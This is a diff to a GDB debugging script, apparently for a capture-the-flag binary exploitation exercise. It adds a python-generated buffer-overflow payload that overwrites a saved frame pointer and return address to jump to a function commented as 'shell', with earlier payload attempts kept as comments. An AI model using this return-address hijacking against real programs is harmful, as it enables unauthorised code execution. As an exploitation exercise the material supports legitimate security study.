@@ -3,13 +3,15 @@
 b *0x40089f
 
 # fgets
-b *0x4008b5
+#b *0x4008b5
 
 # after fgets
 b *0x4008c0
 
 # 0x000000000400806 shell
+# EBP 0x4009c0
 #shell python -c 'print "768\n" + "\x00"*512 + "\x00"*22 + "A"*19 + "\n" + "0\n"' > pwn
 #shell python -c 'print "1024\n" + "A"*527 + "B"*8 + "C"*8 + "\n" + "0\n"' > pwn
-shell python -c 'print "1024\n" + "A"*527 + "B"*8 + "\x06\x08\x40\x00\x00\x00\x00\x00" + "\n" + "0\n"' > pwn
+#shell python -c 'print "1024\n" + "A"*527 + "B"*8 + "\x06\x08\x40\x00\x00\x00\x00\x00" + "\n" + "0\n"' > pwn
+shell python -c 'print "545\n" + "A"*527 + "\xc0\x09\x40\x00\x00\x00\x00\x00" + "\x06\x08\x40\x00\x00\x00\x00\x00" + "\n" + "40\n" + "C"*40  + "\n" + "0\n"' > pwn
 r < pwn
